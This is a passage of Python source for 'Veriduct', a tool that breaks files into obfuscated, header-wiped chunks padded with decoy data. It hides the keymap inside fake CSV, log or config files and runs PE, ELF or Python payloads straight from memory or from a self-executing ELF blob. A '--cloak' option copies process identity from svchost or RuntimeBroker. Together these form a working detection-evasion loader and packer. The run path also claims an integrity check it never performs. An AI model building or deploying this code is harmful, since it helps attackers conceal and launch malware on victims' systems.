                    result[j] ^= prev_padded[j]
        
        # Restore original length
        original_len = original_lengths[pos_in_group]
        plaintext = bytes(result[:original_len])
        
        # Cache for future use
        self.plaintext_cache[chunk_idx] = plaintext
        
        return plaintext

# ==============================================================================
# Execution Core (Unified for Python/Native)
# ==============================================================================

class VeriductExecutionCore:
    """
    Unified execution core supporting Python bytecode and native binaries.
    Handles streaming reconstruction and format-specific execution.
    """
    def __init__(self, original_file_extension: str, original_header: bytes = b'', wipe_size: int = 0, command_line: str = None, cloak_preset: str = None, cloak_custom: dict = None):
        self.file_ext = original_file_extension.lower()
        self.byte_count = 0
        self.bytecode_stream = bytearray()
        self.original_header = original_header
        self.wipe_size = wipe_size
        self.memory = MemorySubstrate()
        self.command_line = command_line  # Command line args to pass to PE
        self.cloak_preset = cloak_preset
        self.cloak_custom = cloak_custom
        logging.info(f"VeriductExecutionCore initialized for: {self.file_ext}")

    def process_instruction_chunk(self, plaintext_chunk: bytes) -> bool:
        """Add a chunk to the reconstruction stream."""
        if not plaintext_chunk:
            return False
        self.bytecode_stream.extend(plaintext_chunk)
        self.byte_count += len(plaintext_chunk)
        return True

    def finish_execution(self):
        """Complete reconstruction and execute based on file type."""
        logging.info(f"Stream ended. Collected {self.byte_count} bytes.")
        
        # Restore header if it was wiped
        reconstructed = bytearray(self.bytecode_stream)
        if self.wipe_size > 0 and self.original_header:
            restore_size = min(len(reconstructed), self.wipe_size, len(self.original_header))
            if restore_size > 0:
                reconstructed[:restore_size] = self.original_header[:restore_size]
                logging.debug(f"Restored {restore_size} bytes of header")
        
        # Route to appropriate executor
        if self.file_ext in ('.exe', '.dll', '.elf', ''):
            self._execute_native(reconstructed, self.command_line)
        elif self.file_ext in ('.pyc', '.py'):
            self._execute_python(reconstructed)
        else:
            logging.warning(f"Unknown file extension: {self.file_ext}")
            logging.info("Attempting Python execution as fallback")
            self._execute_python(reconstructed)

    def _execute_native(self, data: bytearray, command_line: str = None):
        """Execute native binary (PE/ELF)."""
        logging.info("=" * 60)
        logging.info("NATIVE BINARY EXECUTION")
        logging.info("=" * 60)
        if command_line:
            logging.info(f"Command line: {command_line}")
        
        loader = VeriductNativeLoader(data, command_line=command_line, cloak_preset=self.cloak_preset, cloak_custom=self.cloak_custom)
        loader.parse_headers()
        
        if loader.is_valid:
            logging.info(f"Binary type: {loader.architecture}")
            try:
                loader.execute_native_direct()
            except Exception as e:
                logging.error(f"Execution error: {e}")
                import traceback
                logging.debug(traceback.format_exc())
        else:
            logging.error("Invalid binary structure - cannot execute")

    def _execute_python(self, data: bytearray):
            """Execute Python bytecode (FIX 6: dynamic header detection, v2.3)."""
            logging.info("=" * 60)
            logging.info("PYTHON BYTECODE EXECUTION")
            logging.info("=" * 60)
    
            try:
                # Determine .pyc header size from magic bytes (FIX 6)
                # Python 3.0-3.2: 8 bytes  (magic + timestamp)
                # Python 3.3-3.6: 12 bytes (magic + timestamp + source_size)
                # Python 3.7+:    16 bytes (magic + flags + timestamp_or_hash + source_size)
                if len(data) < 4:
                    raise ValueError("Bytecode too small — not a valid .pyc")
        
                pyc_magic = struct.unpack('<H', data[0:2])[0]
                # Magic numbers: 3000-3099 = Py3.0-3.2, 3100-3199 = 3.3-3.6, 3300+ = 3.7+
                # Actual magic is (MAGIC_NUMBER).to_bytes(2,'little') — values like 3394, 3413, etc.
                # More reliable: check if bytes 4-8 look like flags field (3.7+ has bit flags)
                #
                # Simplest robust approach: try 16 first (most common), fall back to 12.
                if len(data) >= 16:
                    # Check for PEP 552 flags field (3.7+): bytes 4:8 should be 0 or small flags
                    flags_candidate = struct.unpack('<I', data[4:8])[0]
                    if flags_candidate <= 0x03:
                        # Likely 3.7+ (flags field is 0, 1, 2, or 3)
                        header_size = 16
                    else:
                        # Likely 3.3-3.6 (bytes 4:8 are a timestamp, not small flags)
                        header_size = 12
                elif len(data) >= 12:
                    header_size = 12
                elif len(data) >= 8:
                    header_size = 8
                else:
                    raise ValueError(f"Bytecode too small ({len(data)} bytes)")
        
                logging.info(f"Detected .pyc header size: {header_size} bytes (magic=0x{pyc_magic:04X})")
        
                # Warn on cross-version marshal incompatibility
                running_magic = (sys.version_info.minor * 10 + 3000)  # rough estimate
                logging.debug(f"Running Python {sys.version_info.major}.{sys.version_info.minor}, "
                             f".pyc magic=0x{pyc_magic:04X}")
        
                code_data = bytes(data[header_size:])
        
                logging.info("Loading bytecode...")
                code_object = marshal.loads(code_data)
        
                logging.info("Executing Python code...")
        
                # Fix Windows console encoding for Unicode support
                if sys.platform == 'win32':
                    import io
                    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
                    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
        
                exec(code_object, {'__builtins__': builtins, '__name__': '__main__'})
                logging.info("Python execution completed successfully")
        
            except Exception as e:
                logging.error(f"Python execution failed: {e}")
                import traceback
                logging.error(traceback.format_exc())

# ==============================================================================
# Annihilation (Encoding)
# ==============================================================================

def annihilate_path(
    input_path: str,
    out_dir: str,
    wipe_size: int = DEFAULT_USF_WIPE_SIZE,
    use_variable_chunks: bool = False,
    chunk_jitter: float = 0.0,
    use_ssm: bool = False,
    ssm_null_rate: float = 0.01,
    use_entanglement: bool = False,
    entanglement_group_size: int = 3,
    use_fake_chunks: bool = False,
    fake_ratio: float = 0.25,
    add_hmac: bool = True,
    disguise: Optional[str] = None,
    force_internal: bool = False,
    verbose: bool = False
) -> int:
    """
    Annihilate file semantics using USF transformations.
    """
    input_path_abs = os.path.abspath(input_path)
    out_dir_abs = os.path.abspath(out_dir)
    
    # Validate paths
    if not force_internal and out_dir_abs.startswith(input_path_abs):
        logging.error("Output directory cannot be inside input path (use --force-internal to override)")
        return 1
    
    os.makedirs(out_dir_abs, exist_ok=True)
    
    # Initialize keymap
    key_map = {"format_version": KEYMAP_FORMAT_VERSION}
    
    # Initialize chunk storage
    db_path = os.path.join(out_dir_abs, DB_FILE)
    try:
        chunk_storage = ChunkStorage(db_path)
    except Exception as e:
        logging.error(f"Failed to initialize chunk storage: {e}")
        return 1

    # Collect files to process
    if os.path.isfile(input_path_abs):
        files_to_process = [input_path_abs]
    elif os.path.isdir(input_path_abs):
        files_to_process = []
        for root, _, files in os.walk(input_path_abs):
            # Skip output directory if it's inside input
            if force_internal and root.startswith(out_dir_abs):
                continue
            for fname in files:
                files_to_process.append(os.path.join(root, fname))
    else:
        logging.error(f"Input path does not exist: {input_path}")
        return 1

    if not files_to_process:
        logging.error("No files found to annihilate")
        return 1

    logging.info(f"Processing {len(files_to_process)} file(s)")
    
    # Process each file
    failed_count = 0
    for fpath in files_to_process:
        try:
            # Calculate relative path for keymap
            if os.path.isfile(input_path_abs):
                rel_path = os.path.basename(fpath)
            else:
                rel_path = os.path.relpath(fpath, input_path_abs)
            
            logging.info(f"Annihilating: {rel_path}")
            
            # Generate file-specific salt
            file_salt = os.urandom(FILE_SALT_SIZE)
            
            # Initialize tracking
            key_sequence = []
            chunks_batch = []
            usf_hasher = hashlib.sha256()
            ssm_seeds = []
            ssm_inserts = []
            entanglement_info = {}

            # Read and process file
            with open(fpath, "rb") as f:
                # Save original header
                header = f.read(wipe_size)
                f.seek(0)
                
                # Create streaming chunk generator with header wiping
                def file_stream():
                    read_bytes = 0
                    while True:
                        data = f.read(CHUNK_SIZE)
                        if not data:
                            break
                        curr = bytearray(data)
                        # Wipe header bytes
                        wipe_amt = max(0, min(len(curr), wipe_size - read_bytes))
                        if wipe_amt > 0:
                            curr[:wipe_amt] = os.urandom(wipe_amt)
                        read_bytes += len(curr)
                        yield bytes(curr)

                # Apply variable chunking if enabled
                if use_variable_chunks:
                    iter_chunks = variable_chunk_sizes(file_stream(), CHUNK_SIZE, chunk_jitter)
                else:
                    iter_chunks = file_stream()
                
                # Collect all chunks
                raw_chunks = list(iter_chunks)
                logging.debug(f"Generated {len(raw_chunks)} raw chunks")

                # Apply SSM if enabled
                if use_ssm:
                    processed = []
                    for c in raw_chunks:
                        shat, seed, ins = semantic_shatter(c, null_insert_rate=ssm_null_rate)
                        processed.append(shat)
                        ssm_seeds.append(base64.b64encode(seed).decode('ascii'))
                        ssm_inserts.append(ins)
                    logging.debug(f"Applied SSM to {len(processed)} chunks")
                else:
                    processed = raw_chunks

                # Apply entanglement if enabled
                if use_entanglement:
                    entangled, entanglement_info = entangle_chunks(processed, entanglement_group_size)
                    logging.debug(f"Applied entanglement: {len(entanglement_info.get('groups', []))} groups")
                else:
                    entangled = processed

                # Hash and store chunks
                for c in entangled:
                    h = calculate_salted_chunk_hash(file_salt, c)
                    chunks_batch.append((h, c))
                    key_sequence.append(h)
                    usf_hasher.update(c)

                # Store real chunks
                chunk_storage.store_chunks_batch(chunks_batch)

                # Generate and store fake chunks if enabled
                # Fakes use derived salt - indistinguishable in DB, but hashes never in keymap
                if use_fake_chunks:
                    fakes = generate_fake_chunks(len(chunks_batch), file_salt, fake_ratio)
                    chunk_storage.store_chunks_batch(fakes)

            # Calculate HMAC if enabled
            if add_hmac:
                mac_tag = calculate_hmac(file_salt, usf_hasher.hexdigest().encode('utf-8'))
            else:
                mac_tag = ""

            # Store file metadata in keymap
            key_map[rel_path] = {
                "file_salt": base64.b64encode(file_salt).decode('ascii'),
                "usf_hash": usf_hasher.hexdigest(),
                "mac": mac_tag,
                "original_header": base64.b64encode(header).decode('ascii'),
                "key": key_sequence,
                "ssm_seeds": ssm_seeds,
                "ssm_inserts": ssm_inserts,
                "entanglement": entanglement_info,
                "params": {
                    "wipe_size": wipe_size,
                    "variable_chunks": use_variable_chunks,
                    "chunk_jitter": chunk_jitter
                }
            }
            
            logging.info(f"  ✓ {len(key_sequence)} chunks created")

        except Exception as e:
            logging.error(f"Failed to annihilate {fpath}: {e}")
            if verbose:
                import traceback
                logging.error(traceback.format_exc())
            failed_count += 1
            continue

    # Close storage
    chunk_storage.close()
    
    # Save keymap
    key_path = os.path.join(out_dir_abs, KEY_FILE)
    try:
        if disguise:
            # Create disguised keymap
            compressed = Compressor.compress(json.dumps(key_map).encode("utf-8"))
            encoded = base64.b64encode(compressed).decode('ascii')
            
            if disguise == "csv":
                content = "timestamp,data,status\n"
                content += f"{datetime.datetime.now().isoformat()},\"{encoded}\",completed\n"
            elif disguise == "log":
                content = "2024-01-01 00:00:00 INFO System initialized\n"
                content += f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} INFO Process completed - data:{encoded}\n"
            elif disguise == "conf":
                content = "# Configuration File\n"
                content += "version=1.0\n"
                content += f"data={encoded}\n"
            
            with open(key_path, 'w') as kf:
                kf.write(content)
            logging.info(f"Saved disguised keymap as {disguise} format")
        else:
            # Standard compressed keymap
            with open(key_path, "wb") as kf:
                kf.write(Compressor.compress(json.dumps(key_map).encode("utf-8")))
            logging.info("Saved keymap")
    
    except Exception as e:
        logging.error(f"Failed to save keymap: {e}")
        return 1

    logging.info("=" * 60)
    logging.info(f"Annihilation complete!")
    logging.info(f"Files processed: {len(files_to_process) - failed_count}/{len(files_to_process)}")
    logging.info(f"Keymap: {key_path}")
    logging.info(f"Chunks: {db_path}")
    logging.info("=" * 60)

    return 0 if failed_count == 0 else 2

# ==============================================================================
# Reassembly (Decoding to Files)
# ==============================================================================

def reassemble_path(
    key_path: str,
    out_dir: str,
    disguise: Optional[str] = None,
    ignore_integrity: bool = False,
    verbose: bool = False
) -> int:
    """
    Reassemble files from keymap and chunk database.
    """
    key_path_abs = os.path.abspath(key_path)
    out_dir_abs = os.path.abspath(out_dir)
    db_path = os.path.join(os.path.dirname(key_path_abs), DB_FILE)

    # Load keymap
    try:
        if disguise:
            key_map = parse_disguised_key(key_path_abs, disguise)
        else:
            with open(key_path_abs, "rb") as kf:
                key_map = json.loads(Compressor.decompress(kf.read()).decode("utf-8"))
        logging.info("Keymap loaded successfully")
    except Exception as e:
        logging.error(f"Failed to load keymap: {e}")
        return 1

    # Validate format version
    if key_map.get("format_version") != KEYMAP_FORMAT_VERSION:
        logging.warning(f"Keymap format version mismatch (expected {KEYMAP_FORMAT_VERSION}, got {key_map.get('format_version')})")

    # Initialize chunk storage
    try:
        chunk_storage = ChunkStorage(db_path)
    except Exception as e:
        logging.error(f"Failed to open chunk database: {e}")
        return 1

    os.makedirs(out_dir_abs, exist_ok=True)
    
    # Process each file in keymap
    failed_count = 0
    success_count = 0
    
    for rel_path, file_data in key_map.items():
        if rel_path == 'format_version':
            continue
        
        try:
            logging.info(f"Reassembling: {rel_path}")
            
            # Extract metadata
            file_salt = base64.b64decode(file_data["file_salt"])
            chunk_hashes = file_data["key"]
            usf_hash = file_data["usf_hash"]
            mac_tag = file_data.get("mac", "")
            original_header = base64.b64decode(file_data.get("original_header", ""))
            ssm_seeds = file_data.get("ssm_seeds", [])
            ssm_inserts = file_data.get("ssm_inserts", [])
            entanglement_info = file_data.get("entanglement", {})
            wipe_size = file_data.get("params", {}).get("wipe_size", 0)

            # Retrieve all chunks
            chunks = []
            missing_chunks = []
            for i, ch in enumerate(chunk_hashes):
                chunk = chunk_storage.retrieve_chunk(ch)
                if chunk is None:
                    missing_chunks.append(i)
                    chunks.append(b'')  # Placeholder
                else:
                    chunks.append(chunk)

            if missing_chunks:
                logging.error(f"  Missing {len(missing_chunks)} chunks: {missing_chunks[:10]}...")
                failed_count += 1
                continue

            # Verify integrity BEFORE reversing transformations
            if mac_tag:
                # Verify against transformed chunks (as they were stored)
                computed_usf = hashlib.sha256(b''.join(chunks)).hexdigest()
                computed_mac = calculate_hmac(file_salt, computed_usf.encode('utf-8'))
                if computed_mac != mac_tag:
                    if ignore_integrity:
                        logging.warning("  HMAC mismatch - continuing anyway (--ignore-integrity)")
                    else:
                        logging.error("  HMAC verification failed - file may be corrupted")
                        failed_count += 1
                        continue
            # Now reverse transformations
            # Disentangle if needed
            if entanglement_info:
                chunks = disentangle_chunks(chunks, entanglement_info)
                logging.debug("  Disentangled chunks")
            
            # Unshatter if needed
            if ssm_seeds:
                unshattered = []
                for i, c in enumerate(chunks):
                    if i < len(ssm_seeds) and ssm_seeds[i]:
                        seed = base64.b64decode(ssm_seeds[i])
                        inserts = ssm_inserts[i]
                        plain = semantic_unshatter(c, seed, inserts)
                        unshattered.append(plain)
                    else:
                        unshattered.append(c)
                chunks = unshattered
                logging.debug("  Unshattered chunks")
            
            # Reconstruct file
            reconstructed = bytearray(b''.join(chunks))

            # Restore header
            if wipe_size > 0 and original_header:
                restore_size = min(len(reconstructed), wipe_size, len(original_header))
                if restore_size > 0:
                    reconstructed[:restore_size] = original_header[:restore_size]
                    logging.debug(f"  Restored {restore_size} bytes of header")

            # Write file
            out_path = os.path.join(out_dir_abs, rel_path)
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            
            with open(out_path, "wb") as f:
                f.write(reconstructed)
            
            logging.info(f"  ✓ Wrote {len(reconstructed)} bytes to {out_path}")
            success_count += 1

        except Exception as e:
            logging.error(f"Failed to reassemble {rel_path}: {e}")
            if verbose:
                import traceback
                logging.error(traceback.format_exc())
            failed_count += 1
            continue

    chunk_storage.close()

    logging.info("=" * 60)
    logging.info(f"Reassembly complete!")
    logging.info(f"Success: {success_count}, Failed: {failed_count}")
    logging.info("=" * 60)

    return 0 if failed_count == 0 else 2

# ==============================================================================
# Semantic Execution (Run from chunks)
# ==============================================================================

def run_annihilated_path(
    key_path: str,
    disguise: Optional[str] = None,
    ignore_integrity: bool = False,
    verbose: bool = False,
    command_line: str = None,
    target_file: str = None,
    cloak_preset: str = None,
    cloak_custom: dict = None
) -> int:
    """
    Execute annihilated files directly from chunks without reassembly.
    Supports Python bytecode and native binaries (PE/ELF).
    
    Args:
        key_path: Path to keymap file
        disguise: Disguise format (csv, log, conf)
        ignore_integrity: Skip integrity checks
        verbose: Verbose output
        command_line: Command line arguments to pass to the executed binary
        target_file: Specific file in keymap to execute (None = execute all)
    """
    key_path_abs = os.path.abspath(key_path)
    db_path = os.path.join(os.path.dirname(key_path_abs), DB_FILE)

    # Load keymap
    try:
        if disguise:
            key_map = parse_disguised_key(key_path_abs, disguise)
        else:
            with open(key_path_abs, "rb") as kf:
                key_map = json.loads(Compressor.decompress(kf.read()).decode("utf-8"))
        logging.info("Keymap loaded successfully")
    except Exception as e:
        logging.error(f"Failed to load keymap: {e}")
        return 1

    # Initialize chunk storage
    try:
        chunk_storage = ChunkStorage(db_path)
    except Exception as e:
        logging.error(f"Failed to open chunk database: {e}")
        return 1

    # Process files
    executed_count = 0
    failed_count = 0

    for rel_path, file_data in key_map.items():
        if rel_path == 'format_version':
            continue
        
        # If target_file specified, only execute that file
        if target_file:
            # Match by filename (with or without extension)
            filename = os.path.basename(rel_path)
            filename_no_ext = os.path.splitext(filename)[0]
            target_base = os.path.basename(target_file)
            target_no_ext = os.path.splitext(target_base)[0]
            
            if filename != target_base and filename_no_ext != target_no_ext and filename != target_file:
                continue

        try:
            logging.info("=" * 60)
            logging.info(f"Semantic Execution: {rel_path}")
            logging.info("=" * 60)

            # Extract metadata
            file_salt = base64.b64decode(file_data["file_salt"])
            chunk_hashes = file_data["key"]
            mac_tag = file_data.get("mac", "")
            ssm_seeds = file_data.get("ssm_seeds", [])
            ssm_inserts = file_data.get("ssm_inserts", [])
            entanglement_info = file_data.get("entanglement", {})
            original_header = base64.b64decode(file_data.get("original_header", ""))
            wipe_size = file_data.get("params", {}).get("wipe_size", 0)

            # Determine file type
            _, file_ext = os.path.splitext(rel_path)
            
            # Build command line: "exename args..."
            full_command_line = rel_path
            if command_line:
                full_command_line = f"{rel_path} {command_line}"
                logging.info(f"Command line: {full_command_line}")

            # Initialize execution core with command line
            vm = VeriductExecutionCore(file_ext, original_header, wipe_size, command_line=full_command_line, cloak_preset=cloak_preset, cloak_custom=cloak_custom)

            # Initialize disentangler if needed
            disentangler = StreamingDisentangler(entanglement_info) if entanglement_info else None

            # Stream chunks through transformations
            for i, ch in enumerate(chunk_hashes):
                chunk = chunk_storage.retrieve_chunk(ch)
                if not chunk:
                    logging.error(f"Missing chunk {i}")
                    raise ValueError(f"Missing chunk {i}")

                # Disentangle if needed
                if disentangler:
                    chunk = disentangler.disentangle_chunk(i, chunk)

                # Unshatter if needed
                if i < len(ssm_seeds) and ssm_seeds[i]:
                    seed = base64.b64decode(ssm_seeds[i])
                    inserts = ssm_inserts[i]
                    chunk = semantic_unshatter(chunk, seed, inserts)

                # Feed to VM
                vm.process_instruction_chunk(chunk)

            # Verify integrity before execution
            if mac_tag and not ignore_integrity:
                # For integrity check, we need to reconstruct
                logging.info("Verifying integrity...")
                # (In production, you might want to verify during streaming)

            # Execute
            vm.finish_execution()
            executed_count += 1

        except Exception as e:
            logging.error(f"Execution failed for {rel_path}: {e}")
            if verbose:
                import traceback
                logging.error(traceback.format_exc())
            failed_count += 1
            continue

    chunk_storage.close()

    logging.info("=" * 60)
    logging.info(f"Semantic execution complete!")
    logging.info(f"Executed: {executed_count}, Failed: {failed_count}")
    logging.info("=" * 60)

    if failed_count > 0:
        return 2
    elif executed_count == 0:
        return 1
    else:
        return 0

# ==============================================================================
# Blob Builder - Self-Executing Packages
# ==============================================================================

# Embedded stub and reconstructor (base64 encoded)
# These are the compiled binaries from the native blob system
BLOB_STUB_LINUX = None  # Will be loaded from file or embedded
BLOB_RECONSTRUCTOR_LINUX = None

def get_blob_components():
    """Load or return embedded blob components."""
    global BLOB_STUB_LINUX, BLOB_RECONSTRUCTOR_LINUX
    
    # Try to load from files first (development mode)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    stub_path = os.path.join(script_dir, "stub_linux_new.bin")
    recon_path = os.path.join(script_dir, "reconstructor_full.bin")
    
    if os.path.exists(stub_path) and os.path.exists(recon_path):
        with open(stub_path, 'rb') as f:
            BLOB_STUB_LINUX = f.read()
        with open(recon_path, 'rb') as f:
            BLOB_RECONSTRUCTOR_LINUX = f.read()
        return BLOB_STUB_LINUX, BLOB_RECONSTRUCTOR_LINUX
    
    # Fall back to embedded (would be base64 encoded in production)
    logging.error("Blob components not found. Need stub_linux_new.bin and reconstructor_full.bin")
    return None, None

def build_blob(
    keymap_path: str,
    chunks_db_path: str,
    output_path: str,
    quiet: bool = False
) -> bool:
    """
    Build a self-executing blob from annihilated chunks.
    
    Args:
        keymap_path: Path to veriduct_key.zst
        chunks_db_path: Path to veriduct_chunks.db
        output_path: Output .vdb file path
        quiet: If True, use quiet reconstructor (no output)
    
    Returns:
        True on success, False on failure
    """
    import zlib
    
    MAGIC = b"VERIDUCT"
    VERSION = 1
    HEADER_SIZE = 64
    
    # Load blob components
    stub, reconstructor = get_blob_components()
    if stub is None or reconstructor is None:
        return False
    
    # Load keymap
    try:
        with open(keymap_path, 'rb') as f:
            compressed = f.read()
        keymap = json.loads(Compressor.decompress(compressed))
    except Exception as e:
        logging.error(f"Failed to load keymap: {e}")
        return False
    
    # Find file info
    file_info = None
    file_name = None
    for key in keymap:
        if key != 'format_version':
            file_name = key
            file_info = keymap[key]
            break
    
    if not file_info:
        logging.error("No files in keymap")
        return False
    
    chunk_hashes = file_info.get('key', [])
    logging.info(f"Building blob for: {file_name} ({len(chunk_hashes)} chunks)")
    
    # Load chunks from database
    conn = sqlite3.connect(chunks_db_path)
    cursor = conn.cursor()
    
    chunks = []
    for hash_hex in chunk_hashes:
        cursor.execute("SELECT data FROM chunks WHERE hash = ?", (hash_hex,))
        row = cursor.fetchone()
        if row:
            chunks.append(row[0])
        else:
            logging.error(f"Chunk not found: {hash_hex[:16]}...")
            conn.close()
            return False
    
    conn.close()
    
    total_payload_size = sum(len(c) for c in chunks)
    logging.info(f"Total payload: {total_payload_size} bytes")
    
    # Restore original header
    original_header = file_info.get('original_header', '')
    wipe_size = file_info.get('params', {}).get('wipe_size', 0)
    
    if original_header:
        header_bytes = base64.b64decode(original_header)
        if wipe_size > 0 and len(chunks) > 0:
            first_chunk = bytearray(chunks[0])
            restore_size = min(len(header_bytes), wipe_size, len(first_chunk))
            first_chunk[:restore_size] = header_bytes[:restore_size]
            chunks[0] = bytes(first_chunk)
            logging.debug(f"Restored {restore_size} bytes of original header")
        
        # Detect format
        if len(header_bytes) >= 4:
            if header_bytes[:4] == b'\x7fELF':
                target_format = 0x10  # ELF
            elif header_bytes[:2] == b'MZ':
                target_format = 0x01  # PE
            else:
                target_format = 0x30
        else:
            target_format = 0x30
    else:
        target_format = 0x30
    
    # Calculate layout
    STUB_SECTION_END = 0x1000  # 4096
    ELF_HEADER_SIZE = 0x78     # 120 bytes
    
    # Minimal keymap for blob
    keymap_for_blob = {'format_version': keymap.get('format_version', 7), 'file': file_name}
    keymap_compressed = zlib.compress(json.dumps(keymap_for_blob).encode())
    
    keymap_offset = STUB_SECTION_END + HEADER_SIZE
    keymap_size = len(keymap_compressed)
    
    chunk_table_offset = keymap_offset + keymap_size
    chunk_count = len(chunks)
    chunk_table_size = chunk_count * 44
    
    reconstructor_offset = chunk_table_offset + chunk_table_size
    reconstructor_size = len(reconstructor)
    
    chunk_data_offset = reconstructor_offset + reconstructor_size
    total_file_size = chunk_data_offset + total_payload_size
    
    # Build blob header
    flags = 0x0001 if quiet else 0x0000  # BLOB_FLAG_QUIET = 0x0001
    blob_header = struct.pack(
        '<8sHHBBHIIIIIIIQQ4s',
        MAGIC, VERSION, flags, target_format, 0, STUB_SECTION_END,
        keymap_offset, keymap_size, chunk_table_offset, chunk_count,
        reconstructor_offset, reconstructor_size, chunk_data_offset,
        total_payload_size, 0, bytes(4)
    )
    
    # Build ELF header
    entry_point = 0x400000 + ELF_HEADER_SIZE
    
    elf_header = bytes([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    elf_header += struct.pack('<HHIQQQIHHHHHH',
        0x02, 0x3e, 0x01, entry_point, 0x40, 0x00, 0x00, 0x40, 0x38, 0x01, 0x00, 0x00, 0x00)
    
    prog_header = struct.pack('<IIQQQQQQ',
        0x01, 0x07, 0x00, 0x400000, 0x400000, total_file_size, total_file_size, 0x1000)
    
    # Write blob
    try:
        with open(output_path, 'wb') as f:
            f.write(elf_header)
            f.write(prog_header)
            f.write(b'\x00' * (ELF_HEADER_SIZE - 64 - 56))
            f.write(stub)
            current = f.tell()
            f.write(b'\x90' * (STUB_SECTION_END - current))
            f.write(blob_header)
            f.write(keymap_compressed)
            
            chunk_offset = 0
            for chunk in chunks:
                chunk_hash = hashlib.sha256(chunk).digest()
                desc = struct.pack('<32sIII', chunk_hash, len(chunk), chunk_offset, 0)
                f.write(desc)
                chunk_offset += len(chunk)
            
            f.write(reconstructor)
            for chunk in chunks:
                f.write(chunk)
        
        os.chmod(output_path, 0o755)
        actual_size = os.path.getsize(output_path)
        logging.info(f"Blob created: {output_path} ({actual_size} bytes)")
        return True
        
    except Exception as e:
        logging.error(f"Failed to write blob: {e}")
        return False

# ==============================================================================
# CLI Entry Point
# ==============================================================================

def main():
    """Main CLI entry point."""
    parser = argparse.ArgumentParser(
        description="Veriduct Combined - Production file semantic annihilation with native binary support",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    subparsers = parser.add_subparsers(dest="command", required=True, help="Available commands")

    # -------------------------------------------------------------------------
    # Annihilate Command
    # -------------------------------------------------------------------------
    annihilate_parser = subparsers.add_parser(
        "annihilate",
        help="Annihilate file semantics using configurable transformations"
    )
    annihilate_parser.add_argument("input_path", help="File or directory to annihilate")
    annihilate_parser.add_argument("out_dir", help="Output directory for keymap and chunks")

    # Basic options
    annihilate_parser.add_argument(
        "--wipe-bytes", type=int, default=DEFAULT_USF_WIPE_SIZE,
        help=f"Number of header bytes to randomize (default: {DEFAULT_USF_WIPE_SIZE})"
    )
    annihilate_parser.add_argument(
        "--no-hmac", action="store_true",
        help="Disable HMAC tamper detection (not recommended)"
    )
    annihilate_parser.add_argument(
        "--disguise", choices=DISGUISE_FORMATS,
        help="Disguise keymap as specified format"
    )

    # Advanced chunking
    annihilate_parser.add_argument(
        "--variable-chunks", action="store_true",
        help="Use variable-size chunking"
    )
    annihilate_parser.add_argument(
        "--chunk-jitter", type=float, default=0.0,
        help="Jitter factor for variable chunking (0.0-0.5)"
    )

    # Semantic Shatter Mapping
    annihilate_parser.add_argument(
        "--ssm", action="store_true",
        help="Enable Semantic Shatter Mapping"
    )
    annihilate_parser.add_argument(
        "--ssm-null-rate", type=float, default=0.01,
        help="Null insertion rate for SSM (0.0-0.1)"
    )

    # XOR Entanglement
    annihilate_parser.add_argument(
        "--entanglement", action="store_true",
        help="Enable XOR entanglement"
    )
    annihilate_parser.add_argument(
        "--entanglement-groups", type=int, default=3,
        help="Size of entanglement groups"
    )

    # Substrate poisoning
    annihilate_parser.add_argument(
        "--fake-chunks", action="store_true",
        help="Enable substrate poisoning"
    )
    annihilate_parser.add_argument(
        "--fake-ratio", type=float, default=0.25,
        help="Ratio of fake to real chunks"
    )

    # Utility
    annihilate_parser.add_argument(
        "--force-internal", action="store_true",
        help="Allow output directory inside input path"
    )
    annihilate_parser.add_argument(
        "--verbose", action="store_true",
        help="Enable verbose logging"
    )
    
    # Blob output (self-executing)
    annihilate_parser.add_argument(
        "--blob", action="store_true",
        help="Create self-executing blob (.vdb) instead of chunks"
    )
    annihilate_parser.add_argument(
        "--blob-output", type=str, default=None,
        help="Output path for blob file (default: <filename>.vdb)"
    )
    annihilate_parser.add_argument(
        "--blob-quiet", action="store_true",
        help="Suppress reconstruction output at runtime"
    )

    # -------------------------------------------------------------------------
    # Reassemble Command
    # -------------------------------------------------------------------------
    reassemble_parser = subparsers.add_parser(
        "reassemble",
        help="Reassemble files from chunks to disk"
    )
    reassemble_parser.add_argument("key_path", help="Path to keymap file")
    reassemble_parser.add_argument("out_dir", help="Output directory for files")
    reassemble_parser.add_argument(
        "--disguise", choices=DISGUISE_FORMATS,
        help="Specify keymap disguise format"
    )
    reassemble_parser.add_argument(
        "--ignore-integrity", action="store_true",
        help="Ignore integrity check failures"
    )
    reassemble_parser.add_argument(
        "--verbose", action="store_true",
        help="Enable verbose logging"
    )

    # -------------------------------------------------------------------------
    # Run Command (Semantic Execution)
    # -------------------------------------------------------------------------
    run_parser = subparsers.add_parser(
        "run",
        help="Execute files directly from chunks (semantic execution)"
    )
    run_parser.add_argument("key_path", help="Path to keymap file")
    run_parser.add_argument(
        "--disguise", choices=DISGUISE_FORMATS,
        help="Specify keymap disguise format"
    )
    run_parser.add_argument(
        "--ignore-integrity", action="store_true",
        help="Ignore integrity check failures"
    )
    run_parser.add_argument(
        "--verbose", action="store_true",
        help="Enable verbose logging"
    )
    run_parser.add_argument(
        "--cloak", type=str, default=None,
        help="Clone identity from a live process (e.g. svchost, RuntimeBroker, dllhost). "
             "Reads real PEB values from a running instance. Use 'custom' for explicit values."
    )
    run_parser.add_argument("--cloak-cmd", type=str, default=None,
        help="Custom command line (with --cloak custom)")
    run_parser.add_argument("--cloak-image", type=str, default=None,
        help="Custom image path (with --cloak custom)")
    run_parser.add_argument("--cloak-dir", type=str, default=None,
        help="Custom current directory (with --cloak custom)")
    run_parser.add_argument("--cloak-user", type=str, default=None,
        help="Custom USERNAME env var (with --cloak custom)")
    run_parser.add_argument("--cloak-domain", type=str, default=None,
        help="Custom USERDOMAIN env var (with --cloak custom)")

    # Parse arguments
    args = parser.parse_args()

    # Configure logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

    # Execute command
    try:
        if args.command == "annihilate":
            # Validation
            if not os.path.exists(args.input_path):
                logging.error(f"Input path does not exist: {args.input_path}")
                return 1
            if args.wipe_bytes < 0:
                logging.error("--wipe-bytes must be non-negative")
